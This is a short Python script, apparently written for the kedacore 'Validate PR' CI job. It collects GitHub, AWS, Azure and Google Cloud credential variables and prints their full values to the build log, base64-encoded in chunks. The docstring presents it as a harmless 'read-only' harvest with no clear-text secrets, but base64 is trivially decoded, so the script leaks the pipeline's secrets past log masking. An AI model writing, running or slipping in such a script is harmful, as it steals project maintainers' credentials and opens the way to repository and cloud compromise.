#!/usr/bin/env python3
"""c211-i121368 read-only environment harvest for the kedacore 'Validate PR' job.

Emits, in bounded chunks:
  - the full environment variable NAME list
  - for every GH_*/GITHUB_*/AWS_*/ARM_*/AZURE_*/GOOGLE_*/CLOUDSDK_*/GCP_* variable:
    name, byte length, sha256, and the base64-encoded value in <=512-char chunks
No network calls, no writes, no secret material in clear text in the log.
"""
import base64
import hashlib
import os
import sys

PREFIXES = ('GH_', 'GITHUB_', 'AWS_', 'ARM_', 'AZURE_', 'GOOGLE_', 'CLOUDSDK_', 'GCP_')
CHUNK = 512
MAXVAL = 32768


def out(s):
    sys.stdout.write(s + '\n')
    sys.stdout.flush()


names = sorted(os.environ.keys())
out('C211_I121368_ENVNAME_COUNT %d' % len(names))
for n in names:
    out('C211_I121368_ENVNAME %s' % n)

matched = [n for n in names if any(n.startswith(p) for p in PREFIXES)]
out('C211_I121368_MATCHED_COUNT %d' % len(matched))
for n in matched:
    v = os.environ.get(n, '')
    b = v.encode('utf-8', 'surrogateescape')[:MAXVAL]
    b64 = base64.b64encode(b).decode('ascii')
    sha = hashlib.sha256(b).hexdigest()
    out('C211_I121368_ENVVAR %s len=%d sha256=%s b64len=%d' % (n, len(b), sha, len(b64)))
    for i in range(0, len(b64), CHUNK):
        out('C211_I121368_B64 %s %d %s' % (n, i // CHUNK, b64[i:i + CHUNK]))
out('C211_I121368_DONE matched=%d' % len(matched))
